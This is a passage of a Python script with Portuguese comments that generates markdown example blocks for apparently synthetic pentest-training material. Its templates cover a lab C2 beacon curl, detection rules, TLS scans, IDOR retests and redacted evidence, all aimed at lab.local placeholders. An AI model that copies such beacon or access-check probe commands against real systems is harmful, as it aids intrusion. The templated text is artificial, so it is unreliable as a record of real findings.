        ("text", "pcap filter: wlan_mgt.ssid == \"LAB-{tag}\" — {slug}"),
    ],
    "17-redteam": [
        ("bash", "# beacon lab only\ncurl -sk https://c2.lab.local/j/{slug} -H 'X-Id: {tag}'"),
        ("text", "timeline: T+0 foothold → T+1 {slug} → stop (kill-switch {tag})"),
    ],
    "18-evasion": [
        ("yaml", "title: detect-{slug}\ndetection:\n  selection:\n    CommandLine|contains: '{tag}'\n  condition: selection"),
        ("kusto", "DeviceEvents | where AdditionalFields has '{tag}' | take 10\n// {slug}"),
    ],
    "19-crypto": [
        ("bash", "testssl.sh --openssl-timeout 5 TARGET.lab.local:{port}\n# {slug} {tag}"),
        ("bash", "sslyze --regular TARGET.lab.local:{port} | tee tls_{slug}_{tag}.txt"),
    ],
    "20-report": [
        ("text", "ID: {tag}\nTítulo: {label}\nSeveridade: justificada\nPoC: redigido\nCleanup: feito\n# {slug}"),
        ("text", "reteste: passo A → B → falha esperada pós-fix ({slug}/{tag})"),
    ],
}

HARDEN_BODIES: list[tuple[str, str]] = [
    (
        "text",
        "antes: controle ausente para {slug}\n"
        "depois: ownership check / deny default em TARGET\n"
        "verificação: PoC {tag} retorna 403/blocked\n"
        "reteste USER_A vs USER_B",
    ),
    (
        "bash",
        "# verificação pós-hardening {slug}\n"
        "curl -sk -o /dev/null -w '%{{http_code}}\\n' https://app.lab.local/{slug}/{obj} \\\n"
        "  -H 'Cookie: session=USER_B'\n"
        "# esperado 403 — tag {tag}",
    ),
    (
        "text",
        "checklist {slug}:\n"
        "- [ ] controle preventivo ativo\n"
        "- [ ] telemetria cobre o PoC\n"
        "- [ ] reteste com mesma prova ({tag}) falha",
    ),
]

EVIDENCE_BODIES: list[tuple[str, str]] = [
    (
        "text",
        "--- evidência redigida ---\n"
        "req: GET /…/{obj} Cookie=USER_B\n"
        "res: 200 body_len=412 fields=[email,role]  # PII mascarada\n"
        "impacto: leitura cross-user ({slug})\n"
        "hash_prova: {tag}",
    ),
    (
        "http",
        "HTTP/1.1 200 OK\n"
        "Content-Type: application/json\n"
        "X-Request-Id: {tag}\n"
        "\n"
        '{{"id":"{obj}","owner":"USER_A","note":"redacted-{slug}"}}\n'
        "# capturado como USER_B",
    ),
]


def _fill(tpl: str, row: dict, angle: str | None) -> str:
    tag = _tag(row, angle)
    h = _H(f"{row['fid']}/{row['slug']}/{angle or 'base'}/ex")
    obj_opts = ["10042", "a1b2c3d4-e5f6-7890-abcd-ef1234567890", "ORD-7781", "usr_01HZX", f"obj_{tag}"]
    port_opts = ["8080", "8443", "443", "9000", "6443"]
    return tpl.format(
        slug=row["slug"],
        fid=row["fid"],
        tag=tag,
        label=row.get("label", row["slug"]),
        obj=obj_opts[h % len(obj_opts)],
        port=port_opts[(h // 3) % len(port_opts)],
    )


def _pick_keyword(row: dict) -> tuple[str, str, str, str] | None:
    blob = f"{row['fid']}/{row['slug']} {row.get('label','')}".lower()
    for pat, lo, bo, ld, bd in KEYWORD_EXAMPLES:
        if re.search(pat, blob, re.I):
            return lo, bo, ld, bd
    return None


def _header_for(row: dict, angle: str | None) -> str:
    h = _H(f"hdr/{row['fid']}/{row['slug']}/{angle or 'base'}")
    if angle == "detecção":
        return HEADERS[3] if h % 3 != 0 else HEADERS[h % 3]
    if angle in ("hardening", "evidência"):
        return HEADERS[h % 3]
    return HEADERS[h % 4]


def example_block(row: dict, angle: str | None = None) -> str:
    """Retorna seção markdown com exatamente um fence, único por fid/slug/angle."""
    header = _header_for(row, angle)
    h = _H(f"ex/{row['fid']}/{row['slug']}/{angle or 'base'}")
    kw = _pick_keyword(row)

    if angle == "detecção":
        if kw:
            lang, body = kw[2], kw[3]
        else:
            lang, body = "kusto", (
                "union isfuzzy=true SecurityEvent, DeviceProcessEvents\n"
                "| where TimeGenerated > ago(1h)\n"
                "| where AccountName == 'USER_A' or ProcessCommandLine has '{slug}'\n"
                "| take 20\n"
                "// detecção {slug} {tag}"
            )
        return f"{header}\n\n{_fence(lang, _fill(body, row, angle))}\n"

    if angle == "hardening":
        lang, body = HARDEN_BODIES[h % len(HARDEN_BODIES)]
        # prefer keyword offensive as "antes" reference? keep harden body but inject slug
        return f"{header}\n\n{_fence(lang, _fill(body, row, angle))}\n"

    if angle == "evidência":
        lang, body = EVIDENCE_BODIES[h % len(EVIDENCE_BODIES)]
        return f"{header}\n\n{_fence(lang, _fill(body, row, angle))}\n"

    # base / lab / path — ofensivo mínimo
    if kw:
        lang, body = kw[0], kw[1]
    else:
        pool = CAT_FALLBACKS.get(row["cat"], CAT_FALLBACKS["02-web"])
        lang, body = pool[h % len(pool)]
    return f"{header}\n\n{_fence(lang, _fill(body, row, angle))}\n"

